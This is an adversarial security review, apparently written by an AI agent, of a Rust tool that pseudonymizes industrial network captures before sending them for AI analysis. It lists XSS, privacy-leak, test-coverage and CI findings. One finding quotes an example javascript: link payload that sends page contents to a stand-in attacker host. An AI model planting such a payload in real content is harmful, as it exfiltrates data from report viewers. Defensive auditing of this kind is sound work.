# Adversarial Review — ADV-P2 (Implementation)

**Cycle:** v0.4.0-feature
**Pass:** 2
**Target:** implementation
**Scope:** `--scope=full` — all of `src/`, `tests/`, `.github/workflows/`, scripts, fuzz harnesses
**Develop tip reviewed:** `f8e34d7` (post-F-ADV-P1-001..005 fix burst, PR #99)
**Date:** 2026-05-24
**Adversary:** vsdd-factory:adversary (fresh context — no access to ADV-P1 findings, tech-debt register, fix-burst commit messages, or red-gate logs)
**Policies applied:** all 12 policies from `.factory/policies.yaml`

## Pass Summary

- **Total findings:** 21
- **By severity:** **CRITICAL=2**, HIGH=11, MEDIUM=4, LOW=4
- **By category:** Privacy=8, Security=2, Correctness=3, Test-discipline=2, Policy-11=3, Infrastructure=1, Robustness=2
- **Confidence high-watermark:** 13 HIGH-confidence findings
- **Policy compliance:**
  - POL-11 (ci_positive_coverage_assertion): **FAIL** — fuzz.yml (F-ADV-P2-006); cargo-deny (F-ADV-P2-017)
  - POL-12 (no_user_paths_in_committed_artifacts): pass (lint script wired; F-ADV-P2-009 is runtime-path leak, not committed artifact)
  - POL-1..10: not assessed (out of implementation-review scope, or not reachable from src/)
- **Novelty assessment:** FIRST-PASS-DOMINANT (~13 of 21 findings are genuinely new perimeter)
- **Trajectory:** **18 → 21 — REGRESSION FLAG** (see analysis below)
- **Recommendation:** **FIX-AND-RERUN** (both CRITICAL findings undermine the project's marquee privacy claim)

## Trajectory regression analysis

The skill's iron law requires monotonically-decreasing findings across passes. P2 has 21 > P1's 18, which triggers the regression-investigation gate. Categorization of the 21 findings:

| Category | Count | IDs |
|---|---:|---|
| **NEW** (P2 found things P1 missed — perimeter expansion) | 13 | F-ADV-P2-004, 007, 008, 009, 010, 012, 013, 014, 015, 016, 018, 019, 020 |
| **Severity-reclassified-higher** (same bug as P1, P2 thinks it's worse) | 2 | F-ADV-P2-001 (P1 said MEDIUM, P2 says CRITICAL); F-ADV-P2-002 (P1 said MEDIUM, P2 says CRITICAL) |
| **Partial-fix observation** (F-ADV-P1 fix landed but was incomplete) | 2 | F-ADV-P2-003 (F-ADV-P1-005 rewrite still tautological in the load-bearing branch); F-ADV-P2-005 (F-ADV-P1-004 added non-empty map but no oracle) |
| **Still-OPEN-in-tech-debt** (P1 finding not yet fixed, P2 rediscovered) | 4 | F-ADV-P2-006 (≈ F-ADV-P1-011), F-ADV-P2-011 (≈ F-ADV-P1-017), F-ADV-P2-017 (extends F-ADV-P1-010/011 POL-11 theme), F-ADV-P2-021 (subsumed by F-ADV-P2-004) |

**Conclusion:** the trajectory regression is **NOT caused by the F-ADV-P1 fix burst introducing new defects.** It's explained by (a) fresh-context perimeter expansion — different adversaries find different attack surfaces — and (b) two partial fixes that need follow-up. **Proceed with FIX-AND-RERUN** on the 2 CRITICAL + 11 HIGH findings; the partial-fix items belong in the next burst.

The one genuine NEW defect that was caused by the codebase state (not perimeter expansion) is **F-ADV-P2-014**: `.github/workflows/perf.yml` uses `actions/upload-artifact@v7` which doesn't exist (current major is v4). That's broken right now and would cause CI failures.

---

## CRITICAL findings (2)

### F-ADV-P2-001: `javascript:` URL pseudo-protocol survives AI HTML rendering — XSS / data-exfil vector

**Severity:** CRITICAL
**Category:** Security / Privacy
**Files:** `src/ai/html_render.rs:80-92`, `templates/report.html:419-424`
**Note:** This is the same defect as ADV-P1's F-ADV-P1-014 (filed MEDIUM, still OPEN in tech-debt-register). P2 elevates to CRITICAL because the exfil pathway is more concrete than P1 framed.

**Evidence:** From `html_render.rs`:
```rust
let md = "[click me](javascript:alert(1))";
let html = render_safe(md);
assert!(html.contains("href=\"javascript:"));
```
From `templates/report.html`: `<div class="ai-section">{{ html|safe }}</div>` — askama escaping bypassed.

**Why it's a finding:** A malicious/compromised `claude` CLI can return markdown such as `[Click here for full report](javascript:fetch('https://attacker/'+document.body.innerHTML))`. The link is live in the rendered HTML. Reports are intended to be emailed/shared; a user click triggers exfiltration of the rest of the HTML (which can contain unscrubbed-after-render plant data once the analyst views it).

**Suggested remediation:** Post-process pulldown-cmark HTML output to strip `javascript:` / `data:` / `vbscript:` href attributes, OR drop unsafe URL schemes during the event walk. Flip the test to assert the link IS stripped.

**Confidence:** HIGH

---

### F-ADV-P2-002: Diff pipeline has no fail-closed leak detector — mismatched maps emit raw IPs into diff JSON/HTML/MD output

**Severity:** CRITICAL
**Category:** Privacy
**Files:** `src/cli.rs:267-365` (`run_diff`), `src/diff.rs:284-289`, `src/diff.rs:507-514`
**Note:** Same defect as ADV-P1's F-ADV-P1-007 (filed MEDIUM, still OPEN). P2 elevates to CRITICAL with the concrete attack: mismatched/stale maps cause raw IPs to flow through `unwrap_or(ip_str)` fallbacks into the JSON output.

**Evidence:**
In `run_diff` the final write is `std::fs::write(&output, content)` with no `ensure_clean` call. Contrast with `run_analyze` (`cli.rs:618-619, 774-775`) which does call it before writing the audit log.

In `diff.rs` `ip_to_pseudo` falls back to the raw IP string when the IP is not in the map:
```rust
.unwrap_or(ip_str)
```
And `HostRef::from_asset` falls back to `format!("unmapped:{}", asset.ip)` (`diff.rs:51`) — raw IP with a known prefix.

**Why it's a finding:** Users WILL supply stale/mismatched maps accidentally. Every IP not in the supplied map gets emitted verbatim. The shipped doc-comment claims "fully pseudonymized — no real IPs reach the Diff data structure" — contradicted by the code.

**Suggested remediation:** Add `leak_detector::ensure_clean(&content)?` + map-value sweep against the union of both maps before `std::fs::write` in `run_diff`. Change `ip_to_pseudo` fallback to a hash-based opaque label and emit a stderr warning when this path triggers (or fail-closed in strict mode). Update the doc-comment.

**Confidence:** HIGH

---

## HIGH findings (11)

### F-ADV-P2-003: `composed_privacy_invariant` Kani proof still largely tautological — does not prove what docstring claims

**Severity:** HIGH
**Category:** Test-discipline / Privacy
**Files:** `src/kani_proofs.rs:255-377`
**Note:** Observation against the F-ADV-P1-005 fix. The rewrite added vacuous-case idempotence and structural-soundness checks, but the **non-vacuous branch** (the load-bearing case where scrub actually replaced bytes) is still unasserted. The comment at lines 305-306 explicitly says "If pass 1 DID replace, pass 2 may or may not — we don't assert that case."

**Evidence:** Lines 348-376 assert `byte_contains_model` against a slice-equality search. Both implement substring search; the asserted property is "two substring searches agree on the same bytes" — non-tautological but proves model-self-consistency, not the BC-5.02.003 composition.

**Suggested remediation:** Rewrite to assert: "for any input with at most one occurrence of `real`, after a single `replace_first_model` pass, `byte_contains_model(out, real)` returns `false`" — that IS the composition.

**Confidence:** HIGH

---

### F-ADV-P2-004: `OtError::Parse` overloaded for privacy leaks, parse errors, and CLI argument errors — exit-code 70 cannot distinguish

**Severity:** HIGH
**Category:** Security / Correctness
**Files:** `src/error.rs:21-22,44-50`, `src/ai/leak_detector.rs:76-83,102-107`, `src/cli.rs:280-282,531,911-913`

**Evidence:** The same exit code (70) covers: scrub leak kill-switch, askama render failures, user typing `N` to `--review-scrub`, and CLI argument validation. CI scripts that branch on exit code cannot differentiate "privacy invariant tripped" from "template broken."

**Suggested remediation:** Add `OtError::PrivacyLeak { kind, pattern: String, byte_offset }` with distinct exit code (e.g. 75 EX_TEMPFAIL). Update `ensure_clean` and `ensure_no_map_values` to return the new variant.

**Confidence:** HIGH

---

### F-ADV-P2-005: `scrub_text` fuzz target verifies no property — only panic-absence

**Severity:** HIGH
**Category:** Test-discipline / POL-11
**Files:** `fuzz/fuzz_targets/scrub_text.rs:73-74`
**Note:** Observation against the F-ADV-P1-004 fix. The rewrite added a non-empty map (so the substitution branch RUNS), but `let _ = otsniff::scrub::scrub_text(&text, &map)` discards the output — no `ensure_no_map_values` check, no round-trip check.

**Suggested remediation:** After the `scrub_text` call, run `ensure_no_map_values(&scrubbed, &map)` and `panic!` on `Err` (libfuzzer treats panic as a finding). Optionally assert round-trip.

**Confidence:** HIGH

---

### F-ADV-P2-006: Fuzz CI job has no positive-coverage assertion — POL-11 violation [duplicate of F-ADV-P1-011, still OPEN]

**Severity:** HIGH
**Category:** Policy-11
**Files:** `.github/workflows/fuzz.yml:33-36`

**Suggested remediation:** Grep cargo-fuzz output for `Done \d+ runs`, extract execution count, fail if < 10_000 for `-max_total_time=60`. Echo `Check passed: $RUNS executions completed for ${{ matrix.harness }}` to GITHUB_STEP_SUMMARY.

**Confidence:** HIGH

---

### F-ADV-P2-007: Leak-detector error messages echo the leaked value into stderr (and CI logs)

**Severity:** HIGH
**Category:** Privacy
**Files:** `src/ai/leak_detector.rs:74-86,96-110`

**Evidence:** The error format string includes the raw leaked identifier:
```rust
return Err(OtError::Parse(format!(
    "scrub leak: refusing to send {} pattern '{}' (byte offset {}) to AI provider",
    leak.kind.label(), leak.pattern, leak.byte_offset
)));
```

**Why it's a finding:** When `otsniff analyze --ai` is run in CI and the leak detector fires, the leaked value lands in the build log — which may be world-readable for public repos. The leak detector prevents the value reaching Anthropic, but creates a different egress path.

**Suggested remediation:** Replace `'{}'` with `'<redacted len={}>'` (length + maybe a hash prefix). Optional debug-gated log for diagnostic use.

**Confidence:** HIGH

---

### F-ADV-P2-008: Capture-source `report_line()` MAC can be unscrubbed when dominant MAC isn't in any host's MAC list

**Severity:** HIGH (medium confidence — depends on real-capture incidence)
**Category:** Privacy
**Files:** `src/capture_source.rs` (`report_line()`), `src/report_md.rs:62-64`, `src/cli.rs:554-561,594`, `src/scrub.rs:257-273`

**Evidence:** `build_map` walks `obs.hosts.values().macs`. The `capture_source` detector counts `obs.mac_frame_counts` which can include MACs (SVI / VRRP virtual / passive observer) NOT in any host's list. If the dominant MAC is one of those, it's not pseudonymized — the raw value flows through `scrub_text` into the leak-check. The IPv4/MAC regex catches it (defense in depth) so the user sees a "scrub leak" error rather than a real leak — but the layered assertion fails under a realistic input.

**Suggested remediation:** When building the scrub map, include every MAC in `obs.mac_frame_counts`, not just `host.macs`.

**Confidence:** MEDIUM

---

### F-ADV-P2-009: PCAP path passed by user is fed unscrubbed into AI markdown report header

**Severity:** HIGH
**Category:** Privacy / Security
**Files:** `src/cli.rs:554-561`, `src/report_md.rs:33-40`

**Evidence:** `run_analyze` builds `raw_md` with `args.input.display().to_string()` as the source label. The markdown header is `_Source: \`{path}\` · …_`. If the user's path is `/Users/jane/captures/plant-alpha/192.168.1.100-modbus.pcap`, the entire string (username, plant name, embedded IP) is shipped to Claude. The leak-detector regex catches the IPv4 and aborts — but username and plant name pass through.

**Suggested remediation:** Use `args.input.file_name()` only (basename), then sanitize. Alternatively, drop the path from the AI-bound markdown — use just the SHA-256 (already in audit log).

**Confidence:** HIGH

---

### F-ADV-P2-010: DHCP hostname filter silently drops non-ASCII bytes, creating a scrub-map ↔ report-string mismatch

**Severity:** MEDIUM (listed HIGH-impact, MEDIUM-confidence)
**Category:** Correctness / Privacy
**Files:** `src/parse/dhcp.rs:69-78`

**Evidence:** `.iter().filter(|&&b| (0x20..0x7F).contains(&b)).map(|&b| b as char)` drops non-ASCII bytes. `LINE-3-Ümlaut` becomes `LINE-3-mlaut`. Scrub map stores the corrupted value; merge-map identity breaks; single-letter survivors become regex-friendly scrub targets that destroy report readability.

**Suggested remediation:** Decode hostname bytes via `String::from_utf8_lossy`, preserve identifying characters, reject if any control characters or shorter than 2 graphemes.

**Confidence:** MEDIUM

---

### F-ADV-P2-011: `merge_map`'s EC-002 panic is reachable from a malicious user-supplied baseline map [duplicate of F-ADV-P1-017]

**Severity:** MEDIUM
**Category:** Robustness / Security
**Files:** `src/scrub.rs:200-216`, reachable via `src/cli.rs:467-477`

**Suggested remediation:** Convert EC-002 panic to `Err(OtError::Parse("baseline map pseudonym '{pseudo}' collides — regenerate"))`. Extend `validate()` to require pseudonym keys match `^(host|mac|name)_[0-9]+$`.

**Confidence:** HIGH

---

### F-ADV-P2-012: `ipv6_regex` does not match many legitimate IPv6 forms — leak detector blind spot

**Severity:** MEDIUM (impact HIGH if the blind spot ever fires in production; confidence HIGH on the gap itself)
**Category:** Privacy
**Files:** `src/ai/leak_detector.rs:127-130`

**Evidence:** Regex fails on `::1` (loopback), `fe80::1` (link-local), `2001:db8::` (no suffix), `::ffff:192.0.2.1` (IPv4-mapped), zoned `fe80::1%eth0`. If a real IPv6 plant address survives scrub, the leak detector says clean.

**Suggested remediation:** Use `Ipv6Addr::from_str` on each colon-containing token instead of regex. Add explicit tests for the missed forms.

**Confidence:** HIGH

---

### F-ADV-P2-013: `ensure_no_map_values` blocks on first hit only — multi-leak inputs under-reported

**Severity:** MEDIUM
**Category:** Privacy / Diagnostics
**Files:** `src/ai/leak_detector.rs:96-110`

**Suggested remediation:** Collect ALL leaks into a Vec; iterate in reverse-length order (longer values first); skip real values < 4 chars to prevent substring false positives.

**Confidence:** MEDIUM

---

### F-ADV-P2-014: `perf.yml` uses `actions/upload-artifact@v7` — version that does NOT exist [active CI breakage]

**Severity:** HIGH
**Category:** Infrastructure
**Files:** `.github/workflows/perf.yml:59`, contrast with `fuzz.yml:41`, `mutants.yml:49`

**Evidence:** `actions/upload-artifact` current major is v4 (no v7 published). `perf.yml` will fail with "Unable to resolve action `actions/upload-artifact@v7`" — silently if the step has `if: always()`.

**Suggested remediation:** Pin to `@v4`. Add CI lint step that validates workflow action versions.

**Confidence:** HIGH

---

### F-ADV-P2-015: Test smoke-skip pattern silently no-ops when fixtures missing — coverage illusion in CI

**Severity:** HIGH
**Category:** Test-discipline / POL-11
**Files:** `tests/cli_smoke.rs:294-336` (multiple tests)

**Evidence:** `tests/fixtures/` is gitignored; tests gated on `pcap.exists()` silently return when fixture is absent. In CI fixtures are never present — multiple tests "pass" by doing nothing.

**Suggested remediation:** Commit a tiny synthetic PCAP, or generate one in test setup. At minimum: fail the test if `pcap.exists() == false && std::env::var("CI").is_ok()`.

**Confidence:** HIGH

---

## MEDIUM findings (4)

### F-ADV-P2-016: `unscrub_text` regex matches arbitrarily long digit suffixes; `unmapped` uses O(n²) Vec contains

**Severity:** LOW (correctness MEDIUM)
**Category:** Robustness
**Files:** `src/scrub.rs:354-364, 345`

**Suggested remediation:** Limit regex suffix to `[0-9]{1,9}`. Use `HashSet<String>` for unmapped tracking.

**Confidence:** MEDIUM

---

### F-ADV-P2-017: No CI check that `cargo deny` advisories DB is current — POL-11 extension

**Severity:** LOW
**Category:** Policy-11 / Supply-chain
**Files:** `.github/workflows/ci.yml:119-124`

**Suggested remediation:** Configure cargo-deny with explicit `command` + `arguments`. Grep output for advisory-count line as positive coverage.

**Confidence:** MEDIUM

---

### F-ADV-P2-018: `--review-scrub` prompt prints full scrubbed payload to stderr — terminal-history leak

**Severity:** LOW
**Category:** Privacy
**Files:** `src/cli.rs:512-533`

**Suggested remediation:** Write payload to temp file; print path + first/last 20 lines; pause for confirmation.

**Confidence:** LOW

---

### F-ADV-P2-019: `which_claude` skips Windows `.exe` / `.cmd` / `.bat` — false-negative pre-flight on shipped Windows target

**Severity:** LOW
**Category:** Correctness
**Files:** `src/ai/claude_cli.rs:248-258`

**Suggested remediation:** Use `which` crate or expand candidates `["claude", "claude.exe", "claude.cmd", "claude.bat"]` on Windows.

**Confidence:** HIGH

---

## LOW findings (4)

### F-ADV-P2-020: ENIP `engineering_class_cip` heuristic uses fixed offset sweep — can flag benign request descriptors

**Severity:** LOW
**Category:** Correctness (false-positives)
**Files:** `src/parse/enip.rs:53-72`

**Suggested remediation:** Decode CPF item structure properly. Restrict scan window.

**Confidence:** MEDIUM

---

### F-ADV-P2-021: `OtError::Parse` display says "pcap parse error: …" even for non-parse errors [subsumed by F-ADV-P2-004]

**Severity:** LOW
**Category:** Naming / Maintainability
**Files:** `src/error.rs:21-22`

**Suggested remediation:** Subsumed by F-ADV-P2-004 fix.

**Confidence:** HIGH
